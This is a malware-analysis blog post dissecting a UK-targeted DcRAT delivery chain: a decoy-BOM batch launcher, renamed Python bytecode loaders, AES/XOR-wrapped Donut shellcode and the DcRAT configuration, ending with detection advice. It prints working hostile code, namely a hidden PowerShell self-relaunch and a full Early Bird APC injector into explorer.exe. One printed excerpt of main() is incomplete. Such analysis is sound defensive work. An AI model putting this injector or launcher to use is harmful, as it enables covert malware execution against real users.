    Anarchy in the UK: A trycloudflare Open Directory Staging DcRAT Behind Python Bytecode Loaders¶

    Summary¶

    In September 2026 I came across an open directory, fronted by a Cloudflare quick-tunnel, that was staging a small but layered intrusion kit whose filenames and C2 all point at UK targeting. This post walks through the delivery batch file, the three-layer Python bytecode loader it launches, the in-memory shellcode injection into explorer.exe, and the DcRAT payload at the end of the chain.

    Key Takeaways¶

    • The kit delivers commodity DcRAT, and it is probably aimed at UK victims, based on the Uk-prefixed filenames, an UK_ANARCHY component name, and the anarchy10[.]duckdns[.]org C2.
    • The initial-access layer is a Windows batch launcher that hides itself with a fake UTF-16 byte-order mark, relaunches hidden through PowerShell, and executes Python bytecode files that have been renamed with a .py extension.
    • Each loader decrypts an embedded AES-plus-XOR shellcode and injects it into explorer.exe. The shellcode is a Donut loader carrying a .NET DcRAT assembly that beacons to anarchy10[.]duckdns[.]org:1023.

    Background¶

    The kit in this post is a small illustration of a large trend: commodity, open-source Windows RATs delivered through short, layered scripting chains that lean on legitimate tooling. AsyncRAT was released as open-source in 2019 and its C# source has been forked, rebranded and rebuilt many times over. DcRat is the most widely-seen of those forks, maintained by a Chinese researcher publishing under the handle qwqdanchun, and its builder replaces AsyncRAT's cryptographic defaults with signatures of its own (a hardcoded PBKDF2 salt DcRatByqwqdanchun and a default X.509 certificate issued by O=DcRat By qwqdanchun, CN=EBOLA) which is precisely what identifies it later in this analysis.

    The delivery half of the chain is equally well-trodden. Cloudflare's free TryCloudflare quick-tunnel service has become a routine way for operators to front a WebDAV or HTTP staging server behind a disposable, TLS-terminated trycloudflare.com sub-domain, and DuckDNS is the corresponding go-to for a rotatable, free A-record pointing at whatever C2 IP the operator has today. The novelty in this sample is not any of those individual pieces, but the pipeline that stitches them together: a batch launcher with a decoy UTF-16 BOM, a bundled CPython, and Python bytecode files renamed .py that carry a self-decoding stub and an in-memory shellcode injector. The final payload turns out to be DcRat inside a Donut loader, but almost none of the loader chain looks obviously malicious in isolation, which is the point.

    Where This Started: An Open Directory Behind a Quick-Tunnel¶

    The lead was a URL, hxxps://periods-genetic-stones-government.trycloudflare[.]com/, that returned a directory listing generated by WsgiDAV 4.3.4 whose banner advertised anonymous read-write access to the root (Figure 1). Random-word trycloudflare.com sub-domains are the fingerprint of a Cloudflare quick tunnel, a one-command tunnel anyone can raise without an account, which terminates TLS on Cloudflare's edge and keeps the origin off the wire.

    The directory carries two distinct loader families side by side. The Uk* set is a Python-based DcRAT loader, and an.zip is a separate certutil and rundll32 DLL loader. I'll focus on the Python family.

    The Launcher: A Batch File That Hides in Plain Sight¶

    The entry point is an obfuscated UkSep14U.bat (a byte-identical twin, UkSep16SU.txt, ships alongside it). It is only 906 bytes, and it is a launcher rather than a payload (Figure 2).

    The file begins with the two bytes FF FE, which is the marker for UTF-16 little-endian text (Figure 3 and Figure 4). The byte sequence FF FE at the start of a file acts as a Byte Order Mark (BOM)1 indicating that the text is encoded in little-endian UTF-16. This is a decoy. Its purpose is to make file, editors, and automated scanners mislabel the file's type.

    Because there are no 00 bytes interleaved after the BOM, this is single-byte content with a decoy BOM, not real UTF-16.

    Now, if we strip the 2-byte BOM, the carriage returns (Figure 6):

    tail -c +3 UkSep14U.bat | tr -d '\r' > UkSep14U.clean.bat
    • tail -c +3 prints the file starting at byte 3, which drops the two BOM bytes FF FE.
    • tr -d '\r' deletes every carriage return, turning CRLF endings into plain LF.
    &cls
@echo off

    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit

    "%USERPROFILE%\Videos\3DAus\python312x32"
    "%USERPROFILE%\Contacts\Str\python312x64"

    The above represents a commodity obfuscator trick2 rather than actor-specific tradecraft. Once triggered, the batch relaunches itself hidden through PowerShell, guarded by a hidden argument so it does not loop forever. Afterwards, it runs every .py file in a bundled Python tree that has been tucked into Videos\3DAus or Contacts\Str, and it finishes by killing any python-parented explorer.exe, which its own comment describes as clearing a prior beacon.

    The hidden PowerShell downloads UkSep16ST.tar from the same tunnel with System.Net.WebClient, tar -xf extracts a python312x64 tree into Contacts\, and python.exe then runs 2LazUKSep16____hvvvvvvvv.py. The launcher and the archive together mean nothing has to be installed on the victim, and a full bundled CPython travels with the payload. CPython is the default, reference implementation of the Python programming language, written in C and Python.3

    From Batch to Bytecode: The Python Loader Chain¶

    When we look at the payload files at the byte level, every one begins with CB 0D 0D 0A. That is the Python 3.12 bytecode magic. So these files are .pyc content that has simply been renamed with a .py extension.

    As we can see, renaming costs the operator nothing and defeats anyone opening the file expecting readable source.

    Python has two forms: Human-readable .py source, and compiled .pyc bytecode that the interpreter actually runs. A .pyc starts with a 4-byte magic number that identifies the Python version, then a small header, then a marshalled (binary-serialised) code object

    In order to make these .pyc files a bit more readable, we can use depyo via npx4. This gives us a better representation of what files are (Figure 9).

    In our analysed case, loading the marshalled code object shows a single class named Kramer, some small nested code objects, and a string of /-separated hex tokens. This is a self-decoding stub. It holds encoded data and a routine that reconstructs Python source at runtime and hands it to exec.

    Recovering the Injector¶

    For reproducibility, here is exactly how I lifted that source out of the stub without running it.

    Reading the stub's constants shows the payload in the raw: the single Kramer class and one very large string of /-separated hex tokens (Figure 9). Each token is the hex-encoded UTF-8 of one shifted character, and Kramer's methods walk that string, undo the shift, rebuild the source, and pass it to exec.

    Because the stub ends in a call to exec, I recover the next layer by intercepting that one call. I replace the interpreter's built-in exec for the duration of a single decode, so when Kramer rebuilds its source and hands it to exec, recovery function receives the string and stores it rather than running it (see below).

    import marshal, builtins, sys, os

path = os.path.abspath(sys.argv[1])
code = marshal.loads(open(path, 'rb').read()[16:])

grabbed, evals = [], []
real_exec, real_eval = builtins.exec, builtins.eval

builtins.exec = lambda obj, *a, **k: grabbed.append(obj)
builtins.eval = lambda src, *a, **k: (evals.append(src), real_eval(src, *a, **k))[1]

try:
    real_exec(code, {'__name__': '__main__', '__file__': path})
except SystemExit:
    pass
finally:
    builtins.exec, builtins.eval = real_exec, real_eval

payload = max((g for g in grabbed if isinstance(g, str)), key=len)
open(path + '.layer.txt', 'w').write(payload)
print(f'[+] exec={len(grabbed)} eval={len(evals)} wrote {len(payload)} bytes')

    Inside the Loader¶

    The recovered Python source is a compact in-memory shellcode injector, that carries its payload as a base64-encoded and multiply-encrypted string and drops the plaintext bytes into a fresh explorer.exe through Early Bird APC injection5. The head of the file exposes the entire cryptographic state of the loader as one dictionary, followed immediately by the base64 blob it will decrypt (Figure 10).

def xor_decrypt(data, key):
    return bytes(a ^ b for a, b in zip(data, key * ((len(data) // len(key)) + 1)))

def aes_decrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data), AES.block_size)

def inject_shellcode(shellcode, process_name):
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    CreateProcessA = kernel32.CreateProcessA
    VirtualAllocEx = kernel32.VirtualAllocEx
    WriteProcessMemory = kernel32.WriteProcessMemory
    QueueUserAPC = kernel32.QueueUserAPC
    ResumeThread = kernel32.ResumeThread
    WaitForSingleObject = kernel32.WaitForSingleObject
    CloseHandle = kernel32.CloseHandle
    GetLastError = kernel32.GetLastError

    CreateProcessA.argtypes = [
        wintypes.LPCSTR, wintypes.LPSTR, wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR,
        ctypes.POINTER(STARTUPINFOA), ctypes.POINTER(PROCESS_INFORMATION)
    ]
    CreateProcessA.restype = wintypes.BOOL

    startup_info = STARTUPINFOA()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()
    CREATE_SUSPENDED = 0x00000004

    print(f"[+] Creating suspended process: {process_name}")
    success = CreateProcessA(
        None, process_name.encode(), None, None, False, CREATE_SUSPENDED,
        None, None, ctypes.byref(startup_info), ctypes.byref(process_info)
    )
    if not success:
        print(f"[-] Failed to create process {process_name}, error code: {GetLastError()}")
        return False

    shellcode_size = len(shellcode)
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    print(f"[+] Allocating {shellcode_size} bytes in target process")
    alloc_addr = VirtualAllocEx(
        process_info.hProcess, None, shellcode_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not alloc_addr:
        print(f"[-] Memory allocation failed, code: {GetLastError()}")
        CloseHandle(process_info.hProcess)
        CloseHandle(process_info.hThread)
        return False

    bytes_written = ctypes.c_size_t(0)
    print("[+] Writing shellcode")
    success = WriteProcessMemory(
        process_info.hProcess, alloc_addr, shellcode, shellcode_size, ctypes.byref(bytes_written)
    )
    if not success or bytes_written.value != shellcode_size:
        print(f"[-] WriteProcessMemory failed, code: {GetLastError()}")
        CloseHandle(process_info.hProcess)
        CloseHandle(process_info.hThread)
        return False

    print("[+] Queueing APC")
    res = QueueUserAPC(alloc_addr, process_info.hThread, 0)
    if res == 0:
        print(f"[-] QueueUserAPC failed, code: {GetLastError()}")
        CloseHandle(process_info.hProcess)
        CloseHandle(process_info.hThread)
        return False

    print("[+] Resuming thread to trigger shellcode")
    ResumeThread(process_info.hThread)
    print("[+] Waiting for execution")
    WaitForSingleObject(process_info.hThread, 0xFFFFFFFF)

    CloseHandle(process_info.hProcess)
    CloseHandle(process_info.hThread)
    print("[+] Injection complete")
    return True

def main():

    if 'aes_key' in keys and 'aes_iv' in keys:
        if 'xor_key1' in keys and 'xor_key2' in keys:
            print("[+] Detected AES+XOR obfuscation")

            aes_data = obfuscated[AES.block_size:]

            temp = xor_decrypt(temp, keys['xor_key2'])
            shellcode = xor_decrypt(temp, keys['xor_key1'])
        else:
            print("[+] Detected AES obfuscation")
            iv = obfuscated[:AES.block_size]
            aes_data = obfuscated[AES.block_size:]
            shellcode = aes_decrypt(aes_data, keys['aes_key'], iv)
    elif 'xor_key1' in keys and 'xor_key2' in keys:
        print("[+] Detected XOR obfuscation")
        temp = xor_decrypt(obfuscated, keys['xor_key2'])
        shellcode = xor_decrypt(temp, keys['xor_key1'])
    else:
        print("[-] No valid decryption keys found!")
        sys.exit(1)

    print(f"[+] Shellcode size: {len(shellcode)} bytes")

    target_process = "explorer.exe"
    if not inject_shellcode(shellcode, process_name=target_process):
        print(f"[-] Injection into {target_process} failed")
        sys.exit(1)

if __name__ == "__main__":
    main()

    main unwraps the payload in four steps:

    iv        = obfuscated[:AES.block_size]
aes_data  = obfuscated[AES.block_size:]
temp      = aes_decrypt(aes_data, keys['aes_key'], iv)
temp      = xor_decrypt(temp, keys['xor_key2'])
shellcode = xor_decrypt(temp, keys['xor_key1'])

    The pipeline is: strip the 16-byte IV prefix, AES-256-CBC decrypt with PKCS#7 unpadding, then two 16-byte repeating-key XOR passes.

    Once shellcode holds the plaintext bytes, inject_shellcode runs a textbook Early Bird APC sequence against a suspended target: CreateProcessA("explorer.exe", CREATE_SUSPENDED), VirtualAllocEx for an RWX region, WriteProcessMemory, QueueUserAPC on the primary thread, then ResumeThread.

    The APC fires during ntdll initialisation, well before any of the target's own code runs. The Python parent then blocks on WaitForSingleObject(target_thread, INFINITE), which explains why the launcher batch reaps explorer.exe processes whose parent is python: the two files are engineered to clean up after each other.

    Unwrapping the Payload¶

    Everything downstream of the loader lives inside that one base64 string.

    # Base64 encoded encrypted shellcode
obfuscated = base64.b64decode("mgZhLu6HH ... ")

    Applying the four transforms main performs recovers the underlying shellcode: strip the 16-byte IV prefix, AES-256-CBC decrypt with PKCS#7 unpadding, then XOR with xor_key2 and again with xor_key1.

    The Recovered Bytes¶

    Loading the shellcode into Detect It Easy identifies the payload immediately as a Donut Loader (Figure 12).

    In Figure 12 we can see that stage two of the loader chain is a Donut 0.9.2 payload carrying a downstream module. What that module is remains to be seen. Chaskey decryption puts every string, API hash, and configuration field inside the Instance out of reach of strings and any offset-based inspection. Fortunately, the same public tooling that generates Donut samples also parses them.

    Peeling the Donut¶

    Volexity's donut-decryptor6 reads the Instance layout, applies the Chaskey key material extracted from the stub, and prints the module and its configuration. Running it against the recovered shellcode gives a 70 KB .NET DLL.

    A first pass with strings on the extracted assembly returns the diagnostic tokens ReadServertData, Server_signa_ture, ValidateServerCertificate, and MutexControl. ReadServertData in particular is the misspelled method name (an extra t) that ships in AsyncRAT's public source7 and has propagated through every fork and rebuild since. On this initial sweep the client reads as AsyncRAT-family, and the specific fork identification is settled once the Aes256 helper is inspected below. For the readable analysis, the DLL is opened in dnSpyEx.

    Loading the extracted DLL into dnSpyEx reveals the full class tree of a lightly-obfuscated AsyncRAT client (Figure 13).

    Every configurable value lives on a single class named Settings. Each field is a public static string, and each field is either a base64-encoded AES-encrypted blob (for values the operator wants opaque to a strings sweep) or, in one case, the base64-encoded master key that decrypts every other field.

    In this variant the field identifiers themselves are lightly obfuscated: Hos_ts, Por_ts, Ver_sion, In_stall, Paste_bin, An_ti, BS_OD, Server_signa_ture, Server_Certificate, Certifi_cate (Figure 14). The underscores inserted mid-word are a low-effort trick against naive substring searches and, as will be shown below, are the second marker separating this build from vanilla AsyncRAT.

    Of the fields shown, three are of immediate interest for infrastructure analysis. Hos_ts and Por_ts carry the command-and-control addressing. MTX carries the mutex name that would identify the client on a live host and is a high-fidelity IoC for endpoint hunting. Two more, Certifi_cate and Server_signa_ture, carry the RSA parameters AsyncRAT uses to pin its server, and are the strongest infrastructure pivot when the same certificate turns up across campaigns.

    Settings.Key holds a base64-encoded seed, and the actual AES key is derived from that seed using PBKDF2-HMAC-SHA1 with a fixed 17-byte salt hardcoded in the assembly. The derivation and decryption routines live in the Aes256 helper class (Figure 15).

    The salt is the identifying detail. It reads:

    DcRatByqwqdanchun

    The client is not AsyncRAT. It is DcRat, qwqdanchun's Chinese fork of AsyncRAT, whose builder replaces AsyncRAT's default salt with the byline hardcoded into the assembly. DcRat inherits most of AsyncRAT's structure and much of its source (which explains the earlier ReadServertData fingerprint), but its cryptographic profile, its obfuscated field names, and the default builder certificate examined below are its own.

    With the correct PBKDF2 parameters in hand, each Settings field decrypts cleanly. Running each field through the Aes256.Decrypt routine, either under dnSpyEx's debugger against the live assembly or by replicating the derivation and AES-256-CBC decryption in Python, yields the client's live configuration.

    Setting a breakpoint on the first statement after InitializeSettings() returns pauses execution the moment every field is decrypted (Figure 16).

    Adding each Settings.* field to a Watch expression prints the client's live configuration without letting a single line of anti-analysis, mutex, persistence, or beacon code execute (Figure 17).

    Attribution and Targeting¶

    I assess UK targeting as a realistic possibility rising to likely, on moderate confidence: the filenames are prefixed Uk, one loader is named UK_ANARCHY, and the C2 is anarchy10[.]duckdns[.]org. The obfuscation and delivery are commodity: the fake-BOM batch trick comes from open-source batch obfuscators, DuckDNS and quick-tunnels are shared infrastructure, and AsyncRAT and DcRat are open-source RATs.

    Detection and Mitigation¶

    If you are defending against this, here is what I would recommend:

    • Alert on explorer.exe whose parent process is python or python.exe. This is the strongest and most durable signal in the chain and is essentially never benign.
    • Alert on python.exe running from %USERPROFILE%\Videos\ or %USERPROFILE%\Contacts\, and on cmd.exe launching .py files through start /b.
    • Hunt for powershell -WindowStyle Hidden that relaunches a .bat by full path with a literal hidden argument, and for certutil -decode producing a .dll followed by rundll32 <temp dll>,Run.
    • Flag .bat or .txt files that begin with a UTF-16 BOM immediately followed by &cls.
    • Treat DNS for *.trycloudflare.com and *.duckdns.org from user endpoints as suspicious, and alert on outbound TCP 1023.
